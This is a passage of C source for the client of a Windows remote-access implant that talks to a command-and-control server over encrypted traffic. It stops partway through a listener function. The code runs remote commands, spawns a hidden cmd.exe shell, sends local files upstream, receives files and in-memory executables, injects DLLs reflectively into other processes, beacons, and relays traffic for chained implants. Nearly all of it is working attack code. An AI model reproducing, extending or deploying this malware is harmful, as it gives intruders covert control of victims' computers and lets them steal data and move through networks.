#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <winnt.h>
#include <minwinbase.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <iphlpapi.h>
#include <sodium.h>
#include <inttypes.h>

#include "crypto_dragon.h"
#include "client_config.h"
#include "transport.h"
#include "reflective_loader.h"
#include "reflective_loader_shellcode.h"

#if defined(_MSC_VER) || defined(__BORLANDC__)
#pragma comment(lib,"Ws2_32.lib")
#endif


/* -- HTTP helpers (transport_http.c) ----------------------------------- */ 
void http_set_hs_mode    (transport_conn_t *conn, int enabled);
void http_set_shell_active(transport_conn_t *conn, int active);
void https_set_hs_mode(transport_conn_t *conn, int enabled);
void https_set_shell_active(transport_conn_t *conn, int active);

#define IS_HTTP (strcmp(UPSTREAM_TRANSPORT, "http") == 0)
#define IS_HTTPS (strcmp(UPSTREAM_TRANSPORT, "https") == 0)

enum {
    OPCODE_LEN = 6,
    ID_LEN = 41
};

#define MAX 2048
#define FILE_CHUNK_SIZE 1900
#define LISTENER_TEXT_BUFSIZE 8192
#define ROUTES_TEXT_BUFSIZE   8192
#define PACKET_HEAD   (9 + ID_LEN)
#define MAX_PACKET_LEN (PACKET_HEAD + sizeof(((PACKET_DRAGON*)0)->payload))

CRITICAL_SECTION send_mutex;

char current_id[ID_LEN] = {0};
char father_id[ID_LEN] = {0};

static uint8_t key_enc[KEY_LEN];
static uint8_t base_iv[NONCE_LEN];
static uint8_t chain_key[KEY_LEN];
static dr_ctr_t tx_ctr = 0;
static dr_ctr_t rx_ctr = 0;

static uint8_t key_enc_father[KEY_LEN];
static uint8_t base_iv_father[NONCE_LEN];
//used in future
static dr_ctr_t tx_ctr_father = 0;
static dr_ctr_t rx_ctr_father = 0;

static dr_ctr_t tx_ctr_shell = 0;
static dr_ctr_t rx_ctr_shell = 0;

//uploads variables
static FILE     *g_upload_fp    = NULL;
static char      g_upload_path[512] = {0};
static uint64_t  g_upload_bytes = 0;

static uint8_t  *g_pe_buf       = NULL;   /* buffer for PE               */
static uint64_t  g_pe_size      = 0;      /* size tot attended           */
static uint64_t  g_pe_received  = 0;      /* byte riceived until now     */
static char      g_pe_args[4096]= {0};    /* arguments (4KB, chunked)    */
static int       g_pe_args_done = 0;      /* 1 = args completed          */
static transport_conn_t *g_pe_conn  = NULL;
static transport_t      *g_pe_trans = NULL;

//download struct
typedef struct {
    char path[512];
    transport_conn_t *conn;
    transport_t *trans;
} DownloadCtx;

typedef struct {
    uint8_t          *pe_bytes;
    uint64_t          pe_size;
    char              args[4096];
    transport_conn_t *conn;
    transport_t      *trans;
} ExecMemCtx;

enum PacketOpcode {
    OPCODE_INIT = 0x00,
    OPCODE_BEACON = 0x01,
    OPCODE_EXEC_CMD = 0x02,
    OPCODE_SHELL_START = 0x03,
    OPCODE_DISCONNECT = 0x04,
    OPCODE_SHELL_DATA = 0x05,
    OPCODE_SHELL_END = 0x06,
    OPCODE_INJECT_DLL = 0x07,
    OPCODE_START_DLL_TRANSFER = 0x08,
    OPCODE_DLL_CHUNK = 0x09,
    OPCODE_END_DLL_TRANSFER = 0x0A,
    OPCODE_START_LISTENER = 0x0B,
    OPCODE_STOP_LISTENER = 0x0C,
    OPCODE_REG_NEW_CLIENT = 0x0D,
    OPCODE_REQ_LISTENERS  = 0x0E,
    OPCODE_REQ_ROUTES     = 0x0F,
    OPCODE_HANDSHAKE_PUBKEY = 0x10,
    OPCODE_HANDSHAKE_ACK = 0x11,
    OPCODE_CLIENT_ID_ASSIGN = 0x12,
    OPCODE_FILE_DOWNLOAD_REQ   = 0x14,
    OPCODE_FILE_DOWNLOAD_CHUNK = 0x15,
    OPCODE_FILE_DOWNLOAD_END   = 0x16,
    OPCODE_FILE_UPLOAD_START = 0x17,
    OPCODE_FILE_UPLOAD_CHUNK = 0x18, 
    OPCODE_FILE_UPLOAD_END = 0x19,
    OPCODE_EXEC_MEM_START = 0x1B,
    OPCODE_EXEC_MEM_CHUNK = 0x1C,
    OPCODE_EXEC_MEM_ARGS  = 0x1D
};

typedef struct RouteTable {
    char client_id[ID_LEN];
    transport_conn_t *conn;
    transport_t *trans;
    int port;
    uint8_t key_enc[KEY_LEN];
    uint8_t base_iv[NONCE_LEN];
    dr_ctr_t* tx_ctr;
    dr_ctr_t* rx_ctr;
    struct RouteTable* next;
} RouteTable;

CRITICAL_SECTION ctr_mutex;

RouteTable* routing_table = NULL;
CRITICAL_SECTION routing_table_mutex;

typedef struct ListenerNode {
    transport_t *trans;
    int listen_fd;
    int port;
    HANDLE thread;
    transport_conn_t *client_conn;
    HANDLE client_thread;
    struct ListenerNode* next;
} ListenerNode;

ListenerNode* listener_list = NULL;
CRITICAL_SECTION listener_list_mutex;

transport_conn_t *upstream_conn;
transport_t *upstream_trans;

typedef struct {
    HANDLE hStdiWrite;
    HANDLE hStdoutRead;
    transport_conn_t *conn;
    transport_t *trans;
    HANDLE hProcess;
    HANDLE hThread;
    HANDLE hThreadHandle;
    volatile LONG active;
} SHELL_CTX;

static SHELL_CTX *g_shell = NULL;

typedef struct {
    char opCode[6];
    uint16_t payload_size;
    uint8_t target_level;
    char target_id[ID_LEN];
    char payload[1998];
} PACKET_DRAGON;

_Static_assert(sizeof(PACKET_DRAGON) == MAX, "PACKET_DRAGON size must be exactly 2048 bytes");

static BYTE *dll_buffer = NULL;
static size_t dll_offset = 0;
static DWORD target_pid = 0;
static int awaiting_dll = 0;

typedef struct PendingRoute {
    transport_conn_t *conn;
    transport_t *trans;
    uint8_t key_enc[KEY_LEN];
    uint8_t base_iv[NONCE_LEN];
    dr_ctr_t* tx_ctr;
    dr_ctr_t* rx_ctr;
    CRITICAL_SECTION mu;
    CONDITION_VARIABLE route_ready;
    BOOL route_assigned;
    char assigned_id[ID_LEN];
    struct PendingRoute* next;
} PendingRoute;

PendingRoute* pending_list = NULL;
CRITICAL_SECTION pending_list_mutex;

/* =========================================================================
 * abort_pending
 *
 * Removes a PendingRoute from the pending list, closes the child
 * connection, and frees all associated resources (counters, mutex).
 * Used when the sub-client handshake fails or times out.
 * ====================================================================== */

static void abort_pending(PendingRoute *p, ListenerNode *node,
                           transport_conn_t *conn)
{
    EnterCriticalSection(&pending_list_mutex);
    PendingRoute **pp = &pending_list;
    while (*pp) {
        if (*pp == p) { *pp = p->next; break; }
        pp = &((*pp)->next);
    }
    LeaveCriticalSection(&pending_list_mutex);
    node->trans->close(conn);
    node->client_conn = NULL;
    DeleteCriticalSection(&p->mu);
    free(p->tx_ctr);
    free(p->rx_ctr);
    free(p);
}

/* =========================================================================
 * serialize_packet
 *
 * Writes a PACKET_DRAGON into a flat byte buffer suitable for
 * encryption and transmission. Layout: opcode(6) | size(2) |
 * level(1) | target_id(41) | payload(variable).
 * Returns total bytes written, or -1 on error.
 * ====================================================================== */

int serialize_packet(PACKET_DRAGON *p, char *buffer) {
    if (!p || !buffer) return -1;
    if (p->payload_size > sizeof p->payload) return -1;
    const size_t total_len = PACKET_HEAD + p->payload_size;
    if (total_len > MAX_PACKET_LEN) return -1;
    memcpy(buffer, p->opCode, OPCODE_LEN);
    uint16_t payload_size_net = htons(p->payload_size);
    memcpy(buffer + 6, &payload_size_net, sizeof(payload_size_net));
    buffer[8] = p->target_level;
    memcpy(buffer + 9, p->target_id, ID_LEN);
    memcpy(buffer + 9 + ID_LEN, p->payload, p->payload_size);
    return 9 + ID_LEN + p->payload_size;
}

/* =========================================================================
 * deserialize_packet
 *
 * Reads a flat byte buffer into a PACKET_DRAGON struct.
 * Inverse of serialize_packet. Returns 0 on success, -1 on error.
 * ====================================================================== */

int deserialize_packet(PACKET_DRAGON *p, char *buffer) {
    if (!p || !buffer) return -1;
    memcpy(p->opCode, buffer, OPCODE_LEN);
    uint16_t payload_size_net;
    memcpy(&payload_size_net, buffer + 6, sizeof(payload_size_net));
    p->payload_size = ntohs(payload_size_net);
    if (p->payload_size > sizeof p->payload) return -1;
    p->target_level = (uint8_t)buffer[8];
    memcpy(p->target_id, buffer + 9, ID_LEN);
    p->target_id[ID_LEN - 1] = '\0';
    memcpy(p->payload, buffer + 9 + ID_LEN, p->payload_size);
    return 0;
}

/* =========================================================================
 * send_packet
 *
 * Encrypts and sends a single PACKET_DRAGON over the given transport.
 * Serializes the packet into plaintext, encrypts into a fixed-size
 * frame, and sends it atomically under send_mutex.
 * Returns 0 on success, -1 on failure.
 * ====================================================================== */

int send_packet(
        transport_conn_t *conn,
        transport_t *trans,
        PACKET_DRAGON *packet,
        const uint8_t key_enc[KEY_LEN],
        const uint8_t base_iv[NONCE_LEN],
        dr_ctr_t *tx_ctr)
{
    uint8_t plain[PLAINTEXT_SIZE] = {0};
    serialize_packet(packet, (char*)plain);

    uint8_t frame[FRAME_SIZE];
    EnterCriticalSection(&send_mutex);
    if (dragon_encrypt_frame(key_enc, base_iv, tx_ctr, plain, frame) != 0) {
        fprintf(stderr, "[CRYPTO] encrypt failed\n");
        LeaveCriticalSection(&send_mutex);
        return -1;
    }
    int r = trans->send(conn, frame, FRAME_SIZE);
    LeaveCriticalSection(&send_mutex);
    if (r != FRAME_SIZE) return -1;
    return 0;
}

/* =========================================================================
 * send_packet_route
 *
 * Encrypts and sends a packet through a routing table entry.
 * Uses the route's own crypto keys and counters. Loops to handle
 * partial sends. Returns 0 on success, -1 on failure.
 * ====================================================================== */

int send_packet_route(PACKET_DRAGON *packet, RouteTable *route) {
    uint8_t plain[PLAINTEXT_SIZE] = {0};
    serialize_packet(packet, (char *)plain);

    uint8_t frame[FRAME_SIZE];
    EnterCriticalSection(&send_mutex);
    if (dragon_encrypt_frame(route->key_enc, route->base_iv, route->tx_ctr, plain, frame) != 0) {
        fprintf(stderr, "[CRYPTO] encrypt failed (route)\n");
        return -1;
    }
    size_t sent = 0;
    while (sent < FRAME_SIZE) {
        int n = route->trans->send(route->conn, (const char*)frame + sent, FRAME_SIZE - sent);
        if (n <= 0) {
            LeaveCriticalSection(&send_mutex);
            return -1;
        }
        sent += n;
    }
    LeaveCriticalSection(&send_mutex);
    return 0;
}

/* =========================================================================
 * two_layer_send
 *
 * Sends a packet with one or two encryption layers depending on
 * LEVEL_CLIENT. Level 1: single-layer encryption with server keys.
 * Level > 1: inner encryption (server end-to-end) + outer encryption
 * (father link). Shell data (0x05) uses a separate counter.
 * Returns 0 on success, negative on failure.
 * ====================================================================== */

static int two_layer_send(transport_conn_t *conn, transport_t *trans, const char *op, const void *buf, uint16_t len) {
    const size_t TAG = crypto_aead_chacha20poly1305_ietf_ABYTES;
    if (len + TAG > sizeof(((PACKET_DRAGON*)0)->payload))
        return -1;

    PACKET_DRAGON pkt = {0};
    snprintf(pkt.opCode, OPCODE_LEN, "%s", op);
    pkt.target_level = LEVEL_CLIENT;
    snprintf(pkt.target_id, ID_LEN, "%s", current_id);

    size_t copy_len = len > sizeof pkt.payload ? sizeof pkt.payload : len;
    if (buf && len > 0) memcpy(pkt.payload, buf, copy_len);

    if (LEVEL_CLIENT == 1) {
        pkt.payload_size = len;
        return send_packet(conn, trans, &pkt, key_enc, base_iv, &tx_ctr);
    }

    uint16_t blob_len;
    if (len == 0) {
        uint8_t dummy = 0;
        if (dragon_encryption_blob(key_enc, base_iv, &tx_ctr, &dummy, 0,
                                   (uint8_t*)pkt.payload, &blob_len) != 0)
            return -2;
        pkt.payload_size = blob_len;
    } else if (strncmp(op, "0x05", OPCODE_LEN) == 0) {
        if (dragon_encryption_blob(key_enc, base_iv, &tx_ctr_shell,
                                   (uint8_t*)pkt.payload, len,
                                   (uint8_t*)pkt.payload, &blob_len) != 0)
            return -2;
        pkt.payload_size = blob_len;
    } else {
        if (dragon_encryption_blob(key_enc, base_iv, &tx_ctr,
                                   (uint8_t*)pkt.payload, len,
                                   (uint8_t*)pkt.payload, &blob_len) != 0)
            return -2;
        pkt.payload_size = blob_len;
    }

    return send_packet(conn, trans, &pkt, key_enc_father, base_iv_father, &tx_ctr_father);
}

/* =========================================================================
 * receive_packet
 *
 * Receives a full encrypted frame from the transport, decrypts it,
 * and deserializes into a PACKET_DRAGON. Blocks until a complete
 * frame arrives. Returns 0 on success, -1 on failure.
 * ====================================================================== */

int receive_packet(
        transport_conn_t *conn,
        transport_t *trans,
        PACKET_DRAGON *pkt,
        const uint8_t key_enc[KEY_LEN],
        const uint8_t base_iv[NONCE_LEN],
        dr_ctr_t *rx_ctr)
{

    uint8_t frame[FRAME_SIZE];
    if (!recv_all(conn, trans, frame, FRAME_SIZE)) {
        fprintf(stderr, "[ERROR] frame recv_all failed\n");
        return -1;
    }

    uint8_t plain[PLAINTEXT_SIZE];
    EnterCriticalSection(&ctr_mutex);
    if (dragon_decrypt_frame(key_enc, base_iv, rx_ctr, frame, plain) != 0) {
        LeaveCriticalSection(&ctr_mutex);
        fprintf(stderr, "[ERROR] decrypt failed\n");
        return -1;
    }
    LeaveCriticalSection(&ctr_mutex);

    if (deserialize_packet(pkt, (char*)plain) != 0) {
        fprintf(stderr, "[ERROR] deserialize failed\n");
        return -1;
    }
    return 0;
}

/* =========================================================================
 * add_route_entry_full
 *
 * Allocates and prepends a new entry to the routing table linked list.
 * Stores the child's crypto keys and counter pointers for relay.
 * Caller must hold routing_table_mutex.
 * ====================================================================== */

void add_route_entry_full(const char *client_id, transport_conn_t *conn, transport_t *trans, int port,
    const uint8_t key_enc[KEY_LEN], const uint8_t base_iv[NONCE_LEN],
    dr_ctr_t* tx_ctr, dr_ctr_t* rx_ctr)
{
    RouteTable *entry = malloc(sizeof(RouteTable));
    if (!entry) return;
    snprintf(entry->client_id, ID_LEN, "%s", client_id);
    entry->conn  = conn;
    entry->trans = trans;
    entry->port  = port;
    memcpy(entry->key_enc, key_enc, KEY_LEN);
    memcpy(entry->base_iv, base_iv, NONCE_LEN);
    entry->tx_ctr = tx_ctr;
    entry->rx_ctr = rx_ctr;
    entry->next   = routing_table;
    routing_table = entry;
}

/* =========================================================================
 * get_routes_text
 *
 * Builds a human-readable string listing all routing table entries.
 * Caller must free the returned buffer. Thread-safe.
 * ====================================================================== */

static char *get_routes_text(void) {
    char *buf = malloc(ROUTES_TEXT_BUFSIZE), *p = buf;
    size_t cap = ROUTES_TEXT_BUFSIZE, used = 0;
    EnterCriticalSection(&routing_table_mutex);
    RouteTable *r = routing_table;
    if (!r) used += snprintf(p, cap - used, "(empty routing table)\n");
    while (r && used < cap - 128) {
        used += snprintf(p + used, cap - used, "ID: %s  |  Port: %d\n",
                         r->client_id, r->port);
        r = r->next;
    }
    LeaveCriticalSection(&routing_table_mutex);
    buf[used] = '\0';
    return buf;
}

/* =========================================================================
 * send_shell_data [LEGACY]
 *
 * Sends shell output data in chunks that fit within a single packet
 * payload. Uses two_layer_send with opcode 0x05. Reserved for future
 * use as an alternative to inline shell sending.
 * ====================================================================== */

static void send_shell_data(transport_conn_t *conn, transport_t *trans,
                             const char *buf, size_t len)
{
    const size_t TAG_BYTES = crypto_aead_chacha20poly1305_ietf_ABYTES;
    const size_t MAX_CLEAR = sizeof(((PACKET_DRAGON*)0)->payload) - TAG_BYTES;
    while (len) {
        size_t chunk = (len > MAX_CLEAR) ? MAX_CLEAR : len;
        if (two_layer_send(conn, trans, "0x05", buf, (uint16_t)chunk) != 0) {
            printf("[ERROR] send_shell_data failed\n");
            return;
        }
        buf += chunk;
        len -= chunk;
    }
}

/* =========================================================================
 * shell_reader [LEGACY]
 *
 * Background thread that reads stdout from the interactive shell
 * process and forwards each chunk to the server via two_layer_send.
 * Exits when the shell closes or a send fails.
 * ====================================================================== */

static DWORD WINAPI shell_reader(LPVOID arg)
{
    char  buf[1024];
    DWORD rd;
    while (g_shell && g_shell->active) {
        if (!ReadFile(g_shell->hStdoutRead, buf, sizeof(buf), &rd, NULL) || rd == 0)
            break;
        if (two_layer_send(g_shell->conn, g_shell->trans, "0x05", buf, (uint16_t)rd) != 0) {
            printf("[ERROR] shell_reader: send failed\n");
            break;
        }
    }
    return 0;
}

/* =========================================================================
 * start_interactive_shell [LEGACY]
 *
 * Spawns cmd.exe with redirected stdin/stdout pipes and starts the
 * shell_reader thread to forward output. Only one shell can be
 * active at a time (guarded by g_shell).
 * ====================================================================== */

static void start_interactive_shell(transport_conn_t *conn, transport_t *trans) {
    printf("[SHELL] start_interactive_shell() called\n");
    if (g_shell) return;

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE inR = NULL, inW = NULL, outR = NULL, outW = NULL;
    if (!CreatePipe(&outR, &outW, &sa, 0)) {
        fprintf(stderr, "CreatePipe stdout FAILED %lu\n", GetLastError());
        return;
    }
    if (!CreatePipe(&inR, &inW, &sa, 0)) {
        fprintf(stderr, "CreatePipe stdin FAILED %lu\n", GetLastError());
        CloseHandle(outR); CloseHandle(outW);
        return;
    }
    SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(inW,  HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {0};
    si.cb        = sizeof(si);
    si.dwFlags   = STARTF_USESTDHANDLES;
    si.hStdInput  = inR;
    si.hStdOutput = outW;
    si.hStdError  = outW;

    PROCESS_INFORMATION pi = {0};
    char cmdLine[] = "cmd.exe /Q /D /K";
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(inR); CloseHandle(inW);
        CloseHandle(outR); CloseHandle(outW);
        return;
    }

    CloseHandle(inR);
    CloseHandle(outW);

    g_shell = (SHELL_CTX *)calloc(1, sizeof(SHELL_CTX));
    g_shell->hStdiWrite   = inW;
    g_shell->hStdoutRead  = outR;
    g_shell->conn         = conn;
    g_shell->trans        = trans;
    g_shell->hProcess     = pi.hProcess;
    g_shell->hThreadHandle= pi.hThread;
    g_shell->active       = 1;

    g_shell->hThread = CreateThread(NULL, 0, shell_reader, NULL, 0, NULL);
    if (!g_shell->hThread) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(inW);
        CloseHandle(outR);
        free(g_shell);
        g_shell = NULL;
    }
}

/* =========================================================================
 * download_thread
 *
 * Reads a local file and sends it to the server in chunks (opcode
 * 0x15). Each chunk carries a 4-byte index followed by up to
 * FILE_CHUNK_SIZE bytes of data. Sends 0x16 with total bytes when
 * done. Runs in a detached thread, frees its DownloadCtx on exit.
 * ====================================================================== */

DWORD WINAPI download_thread(LPVOID arg) {
    DownloadCtx *ctx = (DownloadCtx*)arg;

    FILE *fp = fopen(ctx->path, "rb");
    if (!fp) {
        printf("[DOWNLOAD] Error not be possible open %s\n", ctx->path);
        uint64_t zero = 0;
        two_layer_send(ctx->conn, ctx->trans, "0x16", &zero, sizeof zero);
        free(ctx);
        return 0;
    }

    uint8_t  buf[FILE_CHUNK_SIZE];
    uint32_t chunk_idx  = 0;
    uint64_t total_sent = 0;
    size_t   n;

    while((n = fread(buf, 1, sizeof buf, fp)) > 0) {
        uint8_t payload[4 + FILE_CHUNK_SIZE];
        uint32_t idx_le = chunk_idx;
        memcpy(payload, &idx_le, 4);
        memcpy(payload + 4, buf, n);

        if (two_layer_send(ctx->conn, ctx->trans, "0x15", payload, (uint16_t)(4 + n)) != 0) {
            printf("[DOWNLOAD] Error chunk %u\n", chunk_idx);
            break;
        }
        chunk_idx++;
        total_sent += n;
    }
    fclose(fp);
    uint64_t total_le = total_sent;
    two_layer_send(ctx->conn, ctx->trans, "0x16", &total_le, sizeof(total_le));

    printf("[DOWNLOAD] Completed: %s (%llu byte)\n", ctx->path, (unsigned long long)total_sent);
    free(ctx);
    return 0;
}

/* =========================================================================
 * find_reflective_loader_offset
 *
 * Parses the export table of a raw DLL buffer to find the RVA of
 * the "ReflectiveLoader" export. Returns 0 if not found.
 * ====================================================================== */

DWORD find_reflective_loader_offset(BYTE *dll_buf) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)dll_buf;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(dll_buf + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *export_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY *exports =
        (IMAGE_EXPORT_DIRECTORY *)(dll_buf + export_dir->VirtualAddress);
    DWORD *names     = (DWORD *)(dll_buf + exports->AddressOfNames);
    WORD  *ordinals  = (WORD  *)(dll_buf + exports->AddressOfNameOrdinals);
    DWORD *functions = (DWORD *)(dll_buf + exports->AddressOfFunctions);
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char *func_name = (char *)(dll_buf + names[i]);
        if (strcmp(func_name, "ReflectiveLoader") == 0) {
            WORD  ordinal  = ordinals[i];
            DWORD func_rva = functions[ordinal];
            return func_rva;
        }
    }
    return 0;
}

/* =========================================================================
 * inject_dll_reflective_in_target [LEGACY]
 *
 * Performs reflective DLL injection into a remote process. Allocates
 * RWX memory, writes the DLL, resolves the ReflectiveLoader offset,
 * and launches it via CreateRemoteThread. Legacy code path.
 * ====================================================================== */

void inject_dll_reflective_in_target(BYTE *dll_buf, size_t dll_size, DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return;
    LPVOID remoteBuf = VirtualAllocEx(hProcess, NULL, dll_size,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!remoteBuf) { CloseHandle(hProcess); return; }
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteBuf, dll_buf, dll_size, &written)
        || written != dll_size) {
        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
    DWORD offset = find_reflective_loader_offset(dll_buf);
    LPTHREAD_START_ROUTINE loader =
        (LPTHREAD_START_ROUTINE)((ULONG_PTR)remoteBuf + offset);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        loader, remoteBuf, 0, NULL);
    if (hThread) CloseHandle(hThread);
    CloseHandle(hProcess);
}

/* =========================================================================
 * execute_command
 *
 * Runs a single command via "cmd.exe /c" with redirected output.
 * Reads stdout/stderr and sends it back to the server in chunks
 * using two_layer_send (opcode 0x02). Blocks until the command
 * completes.
 * ====================================================================== */

void execute_command(const char *cmd, transport_conn_t *conn, transport_t *trans) {
    printf("0x02 received %s\n", cmd);
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return;

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb        = sizeof(si);
    si.dwFlags   = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;

    size_t needed = strlen(cmd) + 16;
    char *cmdLine = malloc(needed);
    if (!cmdLine) return;
    snprintf(cmdLine, needed, "cmd.exe /c %s", cmd);
    if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return;
    }
    free(cmdLine);
    CloseHandle(hWrite);

    const size_t TAG      = crypto_aead_chacha20poly1305_ietf_ABYTES;
    const size_t MAX_CLEAR = sizeof(((PACKET_DRAGON*)0)->payload) - TAG;
    DWORD bytesRead;
    char  buffer[2040];

    while (ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, NULL)
           && bytesRead > 0) {
        size_t sent = 0;
        while (sent < bytesRead) {
            size_t chunk = (bytesRead - sent > MAX_CLEAR)
                         ? MAX_CLEAR : (bytesRead - sent);
            if (two_layer_send(conn, trans, "0x02",
                               buffer + sent, (uint16_t)chunk) != 0) {
                printf("[ERROR] execute_command send failed\n");
                goto cleanup;
            }
            sent += chunk;
        }
    }
cleanup:
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

/* =========================================================================
 * Beacon thread
 * ====================================================================== */

typedef struct { transport_conn_t *conn; transport_t *trans; } BEACON_CTX;

/* =========================================================================
 * sendBeacons
 *
 * Background thread that sends periodic beacon packets (opcode 0x01)
 * to keep the connection alive. Used only on TCP transport where
 * there is no implicit polling. Runs forever.
 * ====================================================================== */

DWORD WINAPI sendBeacons(LPVOID data) {
    BEACON_CTX *ctx  = (BEACON_CTX*)data;
    transport_conn_t *conn  = ctx->conn;
    transport_t      *trans = ctx->trans;
    while (1) {
        Sleep(BEACON_INTERVAL * 1000);
        if (two_layer_send(conn, trans, "0x01", NULL, 0) != 0)
            printf("[ERROR] beacon send failed\n");
    }
    return 0;
}

/* =========================================================================
 * find_listener_by_port
 *
 * Returns the ListenerNode for the given port, or NULL if no
 * listener exists on that port. Thread-safe.
 * ====================================================================== */

ListenerNode *find_listener_by_port(int port) {
    EnterCriticalSection(&listener_list_mutex);
    ListenerNode *curr = listener_list;
    while (curr) {
        if (curr->port == port) {
            LeaveCriticalSection(&listener_list_mutex);
            return curr;
        }
        curr = curr->next;
    }
    LeaveCriticalSection(&listener_list_mutex);
    return NULL;
}

/* =========================================================================
 * consume_handshake_blob
 *
 * Decrypts and discards a handshake payload (0x11 or 0x12) that
 * the server sends as an encrypted blob. The decryption advances
 * the rx counter to keep it in sync. Returns 0 on success.
 * ====================================================================== */

static int consume_handshake_blob(const PACKET_DRAGON *pkt) {
    uint8_t dummy[sizeof(pkt->payload)];
    if (dragon_decrypt_payload(key_enc, base_iv, &rx_ctr,
                               (const uint8_t*)pkt->payload,
                               pkt->payload_size, dummy) != 0) {
        printf("[ERROR] Handshake blob decrypt failed (opcode %s)\n", pkt->opCode);
        return -1;
    }
    return 0;
}

/* =========================================================================
 * get_listeners_text
 *
 * Builds a human-readable string listing all active listeners with
 * transport type, port, and occupancy status.
 * Caller must free the returned buffer. Thread-safe.
 * ====================================================================== */

static char *get_listeners_text(void) {
    char *buf = malloc(LISTENER_TEXT_BUFSIZE);
    if (!buf) return NULL;
    size_t cap = LISTENER_TEXT_BUFSIZE, used = 0;
    EnterCriticalSection(&listener_list_mutex);
    ListenerNode *n = listener_list;
    if (!n) {
        int w = snprintf(buf, cap, "(no listener active)\n");
        if (w > 0 && (size_t)w < cap) used = w;
    }
    while (n) {
        int w = snprintf(buf + used, cap - used,
                         "Type: %s - Port: %d (occupied? %s)\n",
                         n->trans->name, n->port,
                         n->client_conn ? "YES" : "NO");
        if (w < 0) break;
        if ((size_t)w >= cap - used) { used = cap - 1; break; }
        used += w;
        n = n->next;
    }
    LeaveCriticalSection(&listener_list_mutex);
    buf[used] = '\0';
    return buf;
}

/* =========================================================================
 * fragment_and_send
 *
 * Splits a text buffer into chunks that fit in a single packet
 * payload and sends each chunk via two_layer_send. Sends a final
 * empty packet as an end-of-data marker.
 * ====================================================================== */

static void fragment_and_send(transport_conn_t *conn, transport_t *trans,
                               const char *op, const char *text)
{
    const size_t TAG      = crypto_aead_chacha20poly1305_ietf_ABYTES;
    const size_t MAX_CLEAR = sizeof(((PACKET_DRAGON*)0)->payload) - TAG;
    size_t len  = strnlen(text, ROUTES_TEXT_BUFSIZE);
    size_t sent = 0;
    while (sent < len) {
        size_t chunk = (len - sent > MAX_CLEAR) ? MAX_CLEAR : (len - sent);
        if (two_layer_send(conn, trans, op, text + sent, (uint16_t)chunk) != 0) {
            printf("[ERROR] fragment_and_send: send failed\n");
            return;
        }
        sent += chunk;
    }
    two_layer_send(conn, trans, op, NULL, 0);
}

/* =========================================================================
 * packet_is_for_me
 *
 * Returns non-zero if the packet's target_id matches this client's
 * current_id.
 * ====================================================================== */

static int packet_is_for_me(const PACKET_DRAGON *p) {
    return strncmp(p->target_id, current_id, ID_LEN) == 0;
}

/* =========================================================================
 * listener_thread
 *
 * Runs a listener that accepts one sub-client at a time. Performs
 * the father-side ECDH handshake, creates a PendingRoute, forwards
 * the sub-client's init and handshake packets upstream, and then
 * enters an infinite relay loop (child -> upstream). The reverse
 * direction (upstream -> child) is handled by receiveFromServer
 * via the routing table. Cleans up and restarts on disconnect.
 * ====================================================================== */

DWORD WINAPI listener_thread(LPVOID arg) {
    ListenerNode* node = (ListenerNode*)arg;
 
    while (1) {
        printf("[LISTENER] waiting for connection in port %d\n", node->port);
        fflush(stdout);
        if (node->client_conn != NULL) { Sleep(100); continue; }
 
        transport_conn_t *conn = node->trans->accept(node->listen_fd, NULL);
        printf("[LISTENER] accept() riturned: %p\n", (void*)conn);
        fflush(stdout);
        if (!conn) continue;
        node->client_conn = conn;
 
        printf("[LISTENER] call dragon handshake\n");
        fflush(stdout);
 
        uint8_t priv_father[32], pub_father[32];
        crypto_box_keypair(pub_father, priv_father);
        uint8_t cli_pub[32];
 
        if (strcmp(node->trans->name, "https") == 0 ||
            strcmp(node->trans->name, "http")  == 0)
        {
            if (!recv_all(conn, node->trans, cli_pub, 32)) {
                printf("[LISTENER] recv pub_client FAILED\n");
                node->trans->close(conn); node->client_conn = NULL; continue;
            }
            if (!send_all(conn, node->trans, pub_father, 32)) {
                printf("[LISTENER] send pub_father FAILED\n");
                node->trans->close(conn); node->client_conn = NULL; continue;
            }
        }
        else
        {
            if (!send_all(conn, node->trans, pub_father, 32)) {
                printf("[LISTENER] send pub_father FAILED\n");
                node->trans->close(conn); node->client_conn = NULL; continue;
            }
            if (!recv_all(conn, node->trans, cli_pub, 32)) {
                printf("[LISTENER] recv pub_client FAILED\n");
                node->trans->close(conn); node->client_conn = NULL; continue;
            }
        }
 
        printf("[LISTENER] handshake completed, deriving keys\n");
        fflush(stdout);
 
        uint8_t shared[32];
        if (crypto_scalarmult(shared, priv_father, cli_pub) != 0) {
            node->trans->close(conn); node->client_conn = NULL; continue;
        }
        uint8_t km[64];
